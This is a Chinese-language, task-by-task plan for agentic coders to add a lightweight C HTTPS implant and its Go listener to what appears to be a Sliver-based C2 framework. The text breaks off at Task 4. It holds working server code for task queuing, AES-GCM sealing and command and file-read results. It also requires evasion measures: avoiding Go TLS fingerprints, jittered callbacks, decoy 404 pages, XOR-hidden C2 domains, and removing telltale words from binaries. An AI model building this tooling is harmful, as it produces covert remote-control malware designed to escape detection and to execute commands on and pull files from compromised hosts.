# 轻量 C 植入体（lite beacon）实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 新增一个 C 编写的轻量 HTTPS 植入体（主机信息 + 执行命令回传 + 读文件回传），与现有 Go 植入体并存，带独立监听器与控制台面板。

**Architecture:** C 植入体走独立 TLV+AES-GCM 协议（不复刻 Sliver 协议栈），服务端新增 `server/litebeacon` 包（TLS 监听 + 任务存储 + 密钥登记 + config.h 生成），Web 控制台新增 `/api/lite/*` 接口与「轻量信标」面板。安全模型：TLS 只管传输加密，载荷由构建期 32 字节共享密钥 AES-256-GCM 认证。外形对抗：系统 TLS 栈（Schannel/OpenSSL，非 Go 指纹）、逐轮随机回连节奏、JSON 信封 + 随机填充、nginx 风格 404 遮蔽、不复用 Sliver 证书特征。

**Tech Stack:** Go（标准库 crypto、net/http）、C99（WinHTTP+BCrypt / OpenSSL）、Docker（debian bookworm + mingw-w64 交叉编译）。

**设计文档:** `docs/superpowers/specs/2026-11-02-lite-beacon-design.md`（协议 TLV 表、节奏算法、安全模型以此为准）

## Global Constraints

- 所有 Go 文件过 `gofmt`；单测只用 `./go-tests.sh` 对应包命令（server 包：`go test -tags=server,go_sqlite <pkg>`）。
- 不 import `client` 包；不引入新的第三方依赖（只用标准库 + 已有内部包）。
- 单测不得触碰真实 `~/.sliver`：涉及文件系统的测试用 `t.Setenv("SLIVER_ROOT_DIR", t.TempDir())`。
- C 代码：C99、无符号剥离（`-Os -s -fno-ident`）、二进制内不得出现明文 C2 域名/密钥（XOR 混淆）；源码与产物内不出现 `beacon/implant/sliver` 字样（注释用中文或中性英文）。
- TLV 小端序；请求/响应体 = `{"<key>":"<base64(nonce[12]||GCM)>"}`。
- 每个任务结束提交一次 git（只 add 本任务文件，不夹带工作区其他改动，`--no-verify`）。

---

### Task 1: litebeacon TLV 编解码

**Files:**
- Create: `server/litebeacon/proto.go`
- Create: `server/litebeacon/proto_test.go`

**Interfaces:**
- Produces: `Task`、`TaskExec/TaskRead/TaskSleep/TaskExit`（byte 常量 0x40/0x41/0x42/0x43）、`BeaconInfo`、`ExecResult`、`FileResult`、`checkin`、`parseCheckin([]byte) (*checkin, error)`、`buildTaskPayload([]Task, int) ([]byte, error)`、`encodeTLVs/decodeTLVs`、`randomBytes(int) []byte`（Task 5/6/9 依赖）。

- [ ] **Step 1: 写失败测试**

`server/litebeacon/proto_test.go`:

```go
package litebeacon

import (
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
)

func TestEncodeDecodeTLVs(t *testing.T) {
	items := []tlv{
		{Type: 0x01, Value: []byte("abcdef0123456789")},
		{Type: 0x02, Value: []byte{1, 2, 3, 4, 5, 6, 7, 8}},
		{Type: 0x0f, Value: bytes.Repeat([]byte{0xAA}, 300)},
	}
	encoded := encodeTLVs(items)
	decoded, err := decodeTLVs(encoded)
	if err != nil {
		t.Fatal(err)
	}
	if len(decoded) != len(items) {
		t.Fatalf("decoded %d items, want %d", len(decoded), len(items))
	}
	for i := range items {
		if decoded[i].Type != items[i].Type || !bytes.Equal(decoded[i].Value, items[i].Value) {
			t.Fatalf("item %d mismatch: %#v", i, decoded[i])
		}
	}
}

func TestDecodeTLVsRejectsTruncation(t *testing.T) {
	if _, err := decodeTLVs([]byte{0x01, 0x05, 0x00, 'a'}); err == nil {
		t.Fatal("expected truncation error")
	}
	// declared 0xFF00 bytes but only 1 present — also truncation
	if _, err := decodeTLVs([]byte{0x01, 0x00, 0xFF, 'a'}); err == nil {
		t.Fatal("expected truncation error")
	}
}

func TestBuildTaskPayloadRejectsOversizeValue(t *testing.T) {
	long := strings.Repeat("a", 0xFFFF+1)
	if _, err := buildTaskPayload([]Task{{ID: 1, Type: TaskExec, Cmd: long, TimeoutSec: 1}}, 0); err == nil {
		t.Fatal("expected oversize rejection")
	}
}

func TestParseCheckin(t *testing.T) {
	now := uint64(1770000000)
	plain := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(now)},
		{Type: tlvHostname, Value: []byte("web01")},
		{Type: tlvOS, Value: []byte("Linux 5.10")},
		{Type: tlvArch, Value: []byte("amd64")},
		{Type: tlvUsername, Value: []byte("root")},
		{Type: tlvPID, Value: u32b(4242)},
		{Type: tlvExecRes, Value: append(append(u32b(7), u32b(0)...), []byte("id output")...)},
		{Type: tlvFileRes, Value: append(append(u32b(9), 0x00), []byte("file-bytes")...)},
	})
	ci, err := parseCheckin(plain)
	if err != nil {
		t.Fatal(err)
	}
	if ci.BeaconID != "0123456789abcdef" || ci.TS != now {
		t.Fatalf("bad id/ts: %#v", ci)
	}
	if ci.Info == nil || ci.Info.Hostname != "web01" || ci.Info.Username != "root" || ci.Info.PID != 4242 {
		t.Fatalf("bad info: %#v", ci.Info)
	}
	if len(ci.Execs) != 1 || ci.Execs[0].TaskID != 7 || ci.Execs[0].Exit != 0 || string(ci.Execs[0].Output) != "id output" {
		t.Fatalf("bad exec result: %#v", ci.Execs)
	}
	if len(ci.Files) != 1 || ci.Files[0].TaskID != 9 || string(ci.Files[0].Content) != "file-bytes" {
		t.Fatalf("bad file result: %#v", ci.Files)
	}
}

func TestParseCheckinRequiresIDAndTS(t *testing.T) {
	if _, err := parseCheckin(encodeTLVs([]tlv{{Type: tlvBeaconID, Value: []byte("x")}})); err == nil {
		t.Fatal("expected missing timestamp error")
	}
	if _, err := parseCheckin(encodeTLVs([]tlv{{Type: tlvTimestamp, Value: u64b(1)}})); err == nil {
		t.Fatal("expected missing id error")
	}
}

func TestParseCheckinNoHello(t *testing.T) {
	plain := encodeTLVs([]tlv{
		{Type: tlvBeaconID, Value: []byte("0123456789abcdef")},
		{Type: tlvTimestamp, Value: u64b(1770000000)},
	})
	ci, err := parseCheckin(plain)
	if err != nil {
		t.Fatal(err)
	}
	if ci.Info != nil {
		t.Fatalf("info should be nil without hello fields: %#v", ci.Info)
	}
}

func TestBuildTaskPayload(t *testing.T) {
	tasks := []Task{
		{ID: 1, Type: TaskExec, Cmd: "id", TimeoutSec: 30},
		{ID: 2, Type: TaskRead, Path: "/etc/hostname"},
		{ID: 3, Type: TaskSleep, IntervalSec: 180, JitterPct: 10},
		{ID: 4, Type: TaskExit},
	}
	payload, err := buildTaskPayload(tasks, 5)
	if err != nil {
		t.Fatal(err)
	}
	items, err := decodeTLVs(payload)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 5 {
		t.Fatalf("got %d items (incl. pad), want 5", len(items))
	}
	if items[0].Type != TaskExec || u32(items[0].Value[0:4]) != 1 ||
		binary.LittleEndian.Uint16(items[0].Value[4:6]) != 30 {
		t.Fatalf("bad exec task: %#v", items[0])
	}
	if string(items[0].Value[6:]) != "id" {
		t.Fatalf("bad exec cmd: %q", items[0].Value[6:])
	}
	if items[1].Type != TaskRead || string(items[1].Value[4:]) != "/etc/hostname" {
		t.Fatalf("bad read task: %#v", items[1])
	}
	if items[2].Type != TaskSleep || u32(items[2].Value[0:4]) != 180 || items[2].Value[4] != 10 {
		t.Fatalf("bad sleep task: %#v", items[2])
	}
	if items[3].Type != TaskExit || len(items[3].Value) != 0 {
		t.Fatalf("bad exit task: %#v", items[3])
	}
	if items[4].Type != tlvPad || len(items[4].Value) != 5 {
		t.Fatalf("bad pad: %#v", items[4])
	}
}

func u64b(v uint64) []byte { b := make([]byte, 8); b[0] = byte(v); b[1] = byte(v >> 8); b[2] = byte(v >> 16); b[3] = byte(v >> 24); b[4] = byte(v >> 32); b[5] = byte(v >> 40); b[6] = byte(v >> 48); b[7] = byte(v >> 56); return b }
func u32b(v uint32) []byte { b := make([]byte, 4); b[0] = byte(v); b[1] = byte(v >> 8); b[2] = byte(v >> 16); b[3] = byte(v >> 24); return b }
func u32(b []byte) uint32 { return uint32(b[0]) | uint32(b[1])<<8 | uint32(b[2])<<16 | uint32(b[3])<<24 }
```

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: FAIL（`tlvBeaconID` 等未定义，编译错误）

- [ ] **Step 3: 写实现**

`server/litebeacon/proto.go`:

```go
// Package litebeacon implements the lightweight C implant listener: a TLS
// endpoint that accepts TLV payloads sealed with a per-build AES-GCM key.
package litebeacon

import (
	"encoding/binary"
	"errors"
	"fmt"
)

// Wire TLV type codes — shared with implant/lite/main.c.
const (
	tlvBeaconID  byte = 0x01
	tlvTimestamp byte = 0x02
	tlvPad       byte = 0x0f
	tlvHostname  byte = 0x10
	tlvOS        byte = 0x11
	tlvArch      byte = 0x12
	tlvUsername  byte = 0x13
	tlvPID       byte = 0x14
	tlvExecRes   byte = 0x20
	tlvFileRes   byte = 0x30
)

// Task types queued by the console.
const (
	TaskExec  byte = 0x40
	TaskRead  byte = 0x41
	TaskSleep byte = 0x42
	TaskExit  byte = 0x43
)

// Wire length field is u16; every emitted value must stay below 65535.
// The 60KB content caps (see port.h) keep all payloads well inside the limit.

type tlv struct {
	Type  byte
	Value []byte
}

func encodeTLVs(items []tlv) []byte {
	size := 0
	for _, it := range items {
		size += 3 + len(it.Value)
	}
	buf := make([]byte, 0, size)
	var lenb [2]byte
	for _, it := range items {
		binary.LittleEndian.PutUint16(lenb[:], uint16(len(it.Value)))
		buf = append(buf, it.Type, lenb[0], lenb[1])
		buf = append(buf, it.Value...)
	}
	return buf
}

func decodeTLVs(data []byte) ([]tlv, error) {
	var items []tlv
	for len(data) > 0 {
		if len(data) < 3 {
			return nil, errors.New("truncated tlv header")
		}
		n := int(binary.LittleEndian.Uint16(data[1:3]))
		if len(data) < 3+n {
			return nil, errors.New("truncated tlv value")
		}
		items = append(items, tlv{Type: data[0], Value: data[3 : 3+n]})
		data = data[3+n:]
	}
	return items, nil
}

// BeaconInfo is the host snapshot sent on the first check-in.
type BeaconInfo struct {
	ID       string `json:"ID"`
	Hostname string `json:"Hostname"`
	OS       string `json:"OS"`
	Arch     string `json:"Arch"`
	Username string `json:"Username"`
	PID      uint32 `json:"PID"`
}

type ExecResult struct {
	TaskID uint32
	Exit   int32
	Output []byte
}

type FileResult struct {
	TaskID  uint32
	Err     uint8
	Content []byte
}

type checkin struct {
	BeaconID string
	TS       uint64
	Info     *BeaconInfo // nil unless hello fields present
	Execs    []ExecResult
	Files    []FileResult
}

// Task is a queued console action, delivered on the next check-in.
type Task struct {
	ID          uint32
	Type        byte // TaskExec / TaskRead / TaskSleep / TaskExit
	Cmd         string
	Path        string
	TimeoutSec  uint16
	IntervalSec uint32
	JitterPct   uint8
}

// parseCheckin decodes a decrypted implant request payload.
func parseCheckin(plain []byte) (*checkin, error) {
	items, err := decodeTLVs(plain)
	if err != nil {
		return nil, err
	}
	ci := &checkin{}
	info := &BeaconInfo{}
	for _, it := range items {
		switch it.Type {
		case tlvBeaconID:
			ci.BeaconID = string(it.Value)
		case tlvTimestamp:
			if len(it.Value) != 8 {
				return nil, errors.New("bad timestamp")
			}
			ci.TS = binary.LittleEndian.Uint64(it.Value)
		case tlvHostname:
			info.Hostname = string(it.Value)
		case tlvOS:
			info.OS = string(it.Value)
		case tlvArch:
			info.Arch = string(it.Value)
		case tlvUsername:
			info.Username = string(it.Value)
		case tlvPID:
			if len(it.Value) != 4 {
				return nil, errors.New("bad pid")
			}
			info.PID = binary.LittleEndian.Uint32(it.Value)
		case tlvExecRes:
			if len(it.Value) < 8 {
				return nil, errors.New("bad exec result")
			}
			ci.Execs = append(ci.Execs, ExecResult{
				TaskID: binary.LittleEndian.Uint32(it.Value[0:4]),
				Exit:   int32(binary.LittleEndian.Uint32(it.Value[4:8])),
				Output: cloneBytes(it.Value[8:]),
			})
		case tlvFileRes:
			if len(it.Value) < 5 {
				return nil, errors.New("bad file result")
			}
			ci.Files = append(ci.Files, FileResult{
				TaskID:  binary.LittleEndian.Uint32(it.Value[0:4]),
				Err:     it.Value[4],
				Content: cloneBytes(it.Value[5:]),
			})
		case tlvPad:
			// padding, ignored
		default:
			// unknown types are ignored for forward compatibility
		}
	}
	if ci.BeaconID == "" || ci.TS == 0 {
		return nil, errors.New("missing beacon id or timestamp")
	}
	if info.Hostname != "" || info.OS != "" || info.Arch != "" || info.Username != "" || info.PID != 0 {
		ci.Info = info
	}
	return ci, nil
}

// buildTaskPayload encodes pending tasks plus a random padding TLV.
// Wire contract (matches implant run_tasks and the spec TLV table):
// exec = [id u32][timeout u16][cmd], read = [id u32][path],
// sleep = [interval u32][jitter u8], exit = empty. Only exec/read carry an ID.
func buildTaskPayload(tasks []Task, padLen int) ([]byte, error) {
	items := make([]tlv, 0, len(tasks)+1)
	for _, t := range tasks {
		value := make([]byte, 0, 10+len(t.Cmd)+len(t.Path))
		switch t.Type {
		case TaskExec:
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint16(value, t.TimeoutSec)
			value = append(value, t.Cmd...)
		case TaskRead:
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = append(value, t.Path...)
		case TaskSleep:
			value = binary.LittleEndian.AppendUint32(value, t.IntervalSec)
			value = append(value, t.JitterPct)
		case TaskExit:
		default:
			return nil, fmt.Errorf("unknown task type %#x", t.Type)
		}
		if len(value) > 0xFFFF {
			return nil, fmt.Errorf("task %#x value exceeds u16 tlv length", t.Type)
		}
		items = append(items, tlv{Type: t.Type, Value: value})
	}
	if padLen > 0 {
		items = append(items, tlv{Type: tlvPad, Value: randomBytes(padLen)})
	}
	return encodeTLVs(items), nil
}

func cloneBytes(b []byte) []byte {
	out := make([]byte, len(b))
	copy(out, b)
	return out
}
```

`randomBytes`（crypto/rand 实现）本任务先落进 `server/litebeacon/crypto.go`，Task 2 在同一文件扩展：

```go
package litebeacon

import "crypto/rand"

// randomBytes returns cryptographically secure random bytes.
func randomBytes(n int) []byte {
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		panic(err) // entropy failure is unrecoverable
	}
	return buf
}
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: PASS

- [ ] **Step 5: gofmt + 提交**

Run: `gofmt -l server/litebeacon`（无输出）后：

```bash
git add server/litebeacon/proto.go server/litebeacon/proto_test.go server/litebeacon/crypto.go
git commit --no-verify -m "feat(litebeacon): TLV 编解码与任务载荷"
```

---

### Task 2: AEAD 加密封装

**Files:**
- Modify: `server/litebeacon/proto.go`（删除占位 randomBytes）
- Create: `server/litebeacon/crypto.go`
- Create: `server/litebeacon/crypto_test.go`

**Interfaces:**
- Consumes: `SecretEntry`（`SecretB64`/`KeyName` 字段，本任务的 secrets.go 已定义最小版）。
- Produces: `deriveKey([]byte) [32]byte`、`sealBody(string, [32]byte, []byte) ([]byte, error)`、`openBody([]byte, []SecretEntry) ([]byte, SecretEntry, []byte, error)`、`randomBytes`、`maxClockSkew`（Task 5 依赖）。

注意：`openBody` 引用 `SecretEntry`，本任务先在 crypto_test.go 用本地定义的同名 struct 会冲突。**处理方式**：本任务顺带在 `secrets.go` 位置先创建最小 `secrets.go` 只含 `SecretEntry` struct 与 `jsonKeyPool`，Task 4 再补全其余（避免占位类型）。

- [ ] **Step 1: 写失败测试**

`server/litebeacon/crypto_test.go`:

```go
package litebeacon

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"testing"
	"time"
)

func TestSealOpenRoundTrip(t *testing.T) {
	secret := randomBytes(32)
	key := deriveKey(secret)
	plain := []byte("hello-lite")
	body, err := sealBody("data", key, plain)
	if err != nil {
		t.Fatal(err)
	}
	var env map[string]string
	if err := json.Unmarshal(body, &env); err != nil {
		t.Fatal(err)
	}
	if len(env) != 1 {
		t.Fatalf("envelope has %d fields, want 1", len(env))
	}
	got, matched, _, err := openBody(body, []SecretEntry{{
		SecretB64: base64.StdEncoding.EncodeToString(secret),
		KeyName:   "data",
	}})
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, plain) {
		t.Fatalf("round trip mismatch: %q", got)
	}
	if matched.KeyName != "data" {
		t.Fatalf("matched wrong entry: %#v", matched)
	}
}

func TestOpenBodyTriesAllSecrets(t *testing.T) {
	secretA := randomBytes(32)
	secretB := randomBytes(32)
	body, err := sealBody("token", deriveKey(secretB), []byte("payload-xyz"))
	if err != nil {
		t.Fatal(err)
	}
	entries := []SecretEntry{
		{SecretB64: base64.StdEncoding.EncodeToString(secretA), KeyName: "a"},
		{SecretB64: base64.StdEncoding.EncodeToString(secretB), KeyName: "b"},
	}
	got, matched, _, err := openBody(body, entries)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, []byte("payload-xyz")) || matched.KeyName != "b" {
		t.Fatalf("wrong match: %#v", matched)
	}
}

func TestOpenBodyRejectsGarbage(t *testing.T) {
	entries := []SecretEntry{{SecretB64: base64.StdEncoding.EncodeToString(randomBytes(32))}}
	for _, bad := range []string{`{}`, `{"a":"x","b":"y"}`, `not json`, `{"a":"!!not-base64!!"}`, `{"a":""}`} {
		if _, _, _, err := openBody([]byte(bad), entries); err == nil {
			t.Fatalf("expected error for %q", bad)
		}
	}
}

func TestDerivedKeyIsContextual(t *testing.T) {
	secret := []byte("0123456789abcdef0123456789abcdef")
	k1 := deriveKey(secret)
	k2 := deriveKey(append(append([]byte{}, secret...), 0))
	if k1 == k2 {
		t.Fatal("context separation broken")
	}
}

func TestMaxClockSkew(t *testing.T) {
	if maxClockSkew != 300*time.Second {
		t.Fatalf("maxClockSkew = %v", maxClockSkew)
	}
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: FAIL（`deriveKey` 等未定义）

- [ ] **Step 3: 写实现**

扩展 `server/litebeacon/crypto.go`（保留 Task 1 写入的 `randomBytes`）。先创建 `server/litebeacon/secrets.go`（本任务最小版，Task 4 扩展）：

```go
package litebeacon

// SecretEntry pairs a build-time shared secret with its JSON envelope key name.
type SecretEntry struct {
	SecretB64 string `json:"secret"` // base64(32 bytes)
	KeyName   string `json:"key"`
}

// jsonKeyPool is the cosmetic envelope field name pool (build-time choice).
var jsonKeyPool = []string{"data", "token", "payload", "blob", "value"}
```

`server/litebeacon/crypto.go`:

```go
package litebeacon

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand" // randomBytes (written in Task 1) lives in this file
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"time"
)

const (
	keyCtx      = "lite/aead/v1" // must match AEAD_CTX in implant/lite/main.c
	nonceSize   = 12
	maxClockSkew = 300 * time.Second
)

// deriveKey folds a shared secret into the AEAD key domain.
func deriveKey(secret []byte) [32]byte {
	var key [32]byte
	h := sha256.New()
	h.Write(secret)
	h.Write([]byte(keyCtx))
	copy(key[:], h.Sum(nil))
	return key
}

// sealBody encrypts plaintext and wraps it in a single-field JSON envelope:
// {"<keyName>":"<base64(nonce||ciphertext||tag)>"}
func sealBody(keyName string, key [32]byte, plaintext []byte) ([]byte, error) {
	aead, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := randomBytes(nonceSize)
	sealed := aead.Seal(nonce, nonce, plaintext, nil)
	return json.Marshal(map[string]string{keyName: base64.StdEncoding.EncodeToString(sealed)})
}

// openBody decodes the envelope and tries every registered secret. The matched
// entry is returned so the caller can respond with the same key name.
func openBody(body []byte, entries []SecretEntry) (plain []byte, matched SecretEntry, nonce []byte, err error) {
	var env map[string]string
	if err := json.Unmarshal(body, &env); err != nil {
		return nil, matched, nil, err
	}
	if len(env) != 1 {
		return nil, matched, nil, errors.New("envelope must have exactly one field")
	}
	var encoded string
	for _, v := range env {
		encoded = v
	}
	sealed, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, matched, nil, err
	}
	if len(sealed) < nonceSize+16 {
		return nil, matched, nil, errors.New("ciphertext too short")
	}
	nonce = sealed[:nonceSize]
	for _, entry := range entries {
		secret, decErr := base64.StdEncoding.DecodeString(entry.SecretB64)
		if decErr != nil || len(secret) != 32 {
			continue
		}
		aead, aErr := newGCM(deriveKey(secret))
		if aErr != nil {
			continue
		}
		if pt, openErr := aead.Open(nil, nonce, sealed[nonceSize:], nil); openErr == nil {
			return pt, entry, nonce, nil
		}
	}
	return nil, matched, nil, errors.New("no secret matched")
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: PASS（proto + crypto 全部）

- [ ] **Step 5: gofmt + 提交**

```bash
git add server/litebeacon/proto.go server/litebeacon/crypto.go server/litebeacon/crypto_test.go server/litebeacon/secrets.go
git commit --no-verify -m "feat(litebeacon): AES-GCM 信封加解密"
```

---

### Task 3: 信标/任务/结果存储

**Files:**
- Create: `server/litebeacon/store.go`
- Create: `server/litebeacon/store_test.go`

**Interfaces:**
- Consumes: `Task`、`ExecResult`、`FileResult`、`BeaconInfo`（Task 1）。
- Produces: `Beacon`、`Result`、`Store`、`NewStore()`、`(*Store) Touch(id string, nonce []byte, info *BeaconInfo, secretHex string, now time.Time) (replayed bool)`、`(*Store) QueueTask(id string, t Task) (Task, bool)`、`(*Store) TakeTasks(id string) []Task`、`(*Store) Delete(id string)`、`(*Store) PushResults(id string, execs []ExecResult, files []FileResult, now time.Time)`、`(*Store) TakeResults(id string) []Result`、`(*Store) ListBeacons() []Beacon`（Task 5/6 依赖）。

- [ ] **Step 1: 写失败测试**

`server/litebeacon/store_test.go`:

```go
package litebeacon

import (
	"testing"
	"time"
)

func TestTouchUpsertsAndDetectsReplay(t *testing.T) {
	s := NewStore()
	now := time.Now()
	info := &BeaconInfo{Hostname: "web01", OS: "Linux", Arch: "amd64", Username: "root", PID: 1}
	if s.Touch("abc", []byte("nonce-1"), info, "aa", now) {
		t.Fatal("first touch must not be a replay")
	}
	if !s.Touch("abc", []byte("nonce-1"), nil, "aa", now) {
		t.Fatal("same nonce must be flagged as replay")
	}
	if s.Touch("abc", []byte("nonce-2"), nil, "aa", now) {
		t.Fatal("fresh nonce must not be a replay")
	}
	beacons := s.ListBeacons()
	if len(beacons) != 1 || beacons[0].ID != "abc" || beacons[0].Info.Hostname != "web01" {
		t.Fatalf("bad beacons: %#v", beacons)
	}
	if !beacons[0].FirstSeen.Equal(now) {
		t.Fatalf("first seen not recorded: %v", beacons[0].FirstSeen)
	}
}

func TestQueueTakeTasks(t *testing.T) {
	s := NewStore()
	now := time.Now()
	s.Touch("abc", []byte("n1"), &BeaconInfo{Hostname: "h"}, "", now)
	if _, ok := s.QueueTask("missing", Task{Type: TaskExit}); ok {
		t.Fatal("queueing to unknown beacon must fail")
	}
	queued, ok := s.QueueTask("abc", Task{Type: TaskExec, Cmd: "id"})
	if !ok || queued.ID != 1 {
		t.Fatalf("queue result: %#v ok=%v", queued, ok)
	}
	tasks := s.TakeTasks("abc")
	if len(tasks) != 1 || tasks[0].ID != 1 {
		t.Fatalf("take: %#v", tasks)
	}
	if again := s.TakeTasks("abc"); len(again) != 0 {
		t.Fatalf("tasks must drain: %#v", again)
	}
}

func TestQueueTaskCapDropsOldest(t *testing.T) {
	s := NewStore()
	s.Touch("abc", []byte("n1"), &BeaconInfo{Hostname: "h"}, "", time.Now())
	for i := 0; i < maxQueuedTasks+5; i++ {
		s.QueueTask("abc", Task{Type: TaskExec, Cmd: "x"})
	}
	tasks := s.TakeTasks("abc")
	if len(tasks) != maxQueuedTasks {
		t.Fatalf("kept %d tasks, want %d", len(tasks), maxQueuedTasks)
	}
}

func TestPushTakeResults(t *testing.T) {
	s := NewStore()
	now := time.Now()
	s.Touch("abc", []byte("n1"), &BeaconInfo{Hostname: "h"}, "", now)
	s.PushResults("abc", []ExecResult{{TaskID: 1, Exit: 0, Output: []byte("hi")}}, nil, now)
	results := s.TakeResults("abc")
	if len(results) != 1 || results[0].Kind != "exec" || string(results[0].Output) != "hi" {
		t.Fatalf("results: %#v", results)
	}
	if again := s.TakeResults("abc"); len(again) != 0 {
		t.Fatalf("results must drain: %#v", again)
	}
}

func TestResultByteCapEvictsOldest(t *testing.T) {
	s := NewStore()
	now := time.Now()
	s.Touch("abc", []byte("n1"), nil, "", now)
	big := make([]byte, maxResultBytes/3)
	for i := 0; i < 5; i++ {
		s.PushResults("abc", []ExecResult{{TaskID: uint32(i + 1), Exit: 0, Output: big}}, nil, now)
	}
	results := s.TakeResults("abc")
	if len(results) != 3 {
		t.Fatalf("expected 3 kept results, got %d", len(results))
	}
	if results[0].TaskID != 3 {
		t.Fatalf("oldest evicted, first kept = %#v", results[0])
	}
}

func TestDeleteBeacon(t *testing.T) {
	s := NewStore()
	s.Touch("abc", []byte("n1"), nil, "", time.Now())
	s.Delete("abc")
	if beacons := s.ListBeacons(); len(beacons) != 0 {
		t.Fatalf("delete failed: %#v", beacons)
	}
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: FAIL（`NewStore` 未定义）

- [ ] **Step 3: 写实现**

`server/litebeacon/store.go`:

```go
package litebeacon

import (
	"sort"
	"sync"
	"time"
)

const (
	maxQueuedTasks  = 32
	maxResults      = 32
	maxResultBytes  = 1 << 20
	maxRecentNonces = 64
)

// Beacon is the console-facing view of a known implant.
type Beacon struct {
	ID        string     `json:"ID"`
	Info      BeaconInfo `json:"Info"`
	SecretB64 string     `json:"SecretB64"`
	FirstSeen time.Time  `json:"FirstSeen"`
	LastSeen  time.Time  `json:"LastSeen"`
}

// Result is a completed task outcome, consumed by the console on read.
type Result struct {
	BeaconID string    `json:"BeaconID"`
	Kind     string    `json:"Kind"` // "exec" or "read"
	TaskID   uint32    `json:"TaskID"`
	Exit     int32     `json:"Exit"`
	Err      uint8     `json:"Err"`
	Output   []byte    `json:"Output"`
	At       time.Time `json:"At"`
}

type beaconState struct {
	info        BeaconInfo
	secretB64   string
	firstSeen   time.Time
	lastSeen    time.Time
	tasks       []Task
	results     []Result
	resultBytes int
	nonces      map[string]struct{}
	nonceOrder  []string
}

// Store holds all lite beacon state in memory.
type Store struct {
	mutex   sync.Mutex
	beacons map[string]*beaconState
	taskSeq uint32
}

func NewStore() *Store {
	return &Store{beacons: map[string]*beaconState{}}
}

// Touch upserts the beacon, refreshes last-seen and enforces the replay
// window. It returns true when the nonce was already seen (reject the call).
func (s *Store) Touch(id string, nonce []byte, info *BeaconInfo, secretB64 string, now time.Time) (replayed bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		st = &beaconState{nonces: map[string]struct{}{}}
		st.firstSeen = now
		st.info.ID = id
		s.beacons[id] = st
	}
	nonceKey := string(nonce)
	if _, dup := st.nonces[nonceKey]; dup {
		return true
	}
	st.nonces[nonceKey] = struct{}{}
	st.nonceOrder = append(st.nonceOrder, nonceKey)
	if len(st.nonceOrder) > maxRecentNonces {
		delete(st.nonces, st.nonceOrder[0])
		st.nonceOrder = st.nonceOrder[1:]
	}
	if info != nil {
		merged := *info
		merged.ID = id
		st.info = merged
	}
	st.secretB64 = secretB64
	st.lastSeen = now
	return false
}

// QueueTask assigns the task an ID and queues it for the next check-in.
// It fails (ok=false) when the beacon is unknown.
func (s *Store) QueueTask(id string, t Task) (Task, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return t, false
	}
	s.taskSeq++
	t.ID = s.taskSeq
	st.tasks = append(st.tasks, t)
	if len(st.tasks) > maxQueuedTasks {
		st.tasks = st.tasks[len(st.tasks)-maxQueuedTasks:]
	}
	return t, true
}

func (s *Store) TakeTasks(id string) []Task {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	tasks := st.tasks
	st.tasks = nil
	return tasks
}

func (s *Store) Delete(id string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.beacons, id)
}

func (s *Store) PushResults(id string, execs []ExecResult, files []FileResult, now time.Time) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return
	}
	push := func(r Result) {
		st.results = append(st.results, r)
		st.resultBytes += len(r.Output)
		for len(st.results) > 0 && (len(st.results) > maxResults || st.resultBytes > maxResultBytes) {
			st.resultBytes -= len(st.results[0].Output)
			st.results = st.results[1:]
		}
	}
	for _, e := range execs {
		push(Result{BeaconID: id, Kind: "exec", TaskID: e.TaskID, Exit: e.Exit, Output: e.Output, At: now})
	}
	for _, f := range files {
		push(Result{BeaconID: id, Kind: "read", TaskID: f.TaskID, Err: f.Err, Output: f.Content, At: now})
	}
}

func (s *Store) TakeResults(id string) []Result {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	results := st.results
	st.results = nil
	st.resultBytes = 0
	return results
}

func (s *Store) ListBeacons() []Beacon {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	out := make([]Beacon, 0, len(s.beacons))
	for id, st := range s.beacons {
		out = append(out, Beacon{ID: id, Info: st.info, SecretB64: st.secretB64, FirstSeen: st.firstSeen, LastSeen: st.lastSeen})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].LastSeen.After(out[j].LastSeen) })
	return out
}
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/litebeacon`
Expected: PASS

- [ ] **Step 5: gofmt + 提交**

```bash
git add server/litebeacon/store.go server/litebeacon/store_test.go
git commit --no-verify -m "feat(litebeacon): 信标/任务/结果内存存储"
```

---

### Task 4: 密钥登记与 config.h 生成

**Files:**
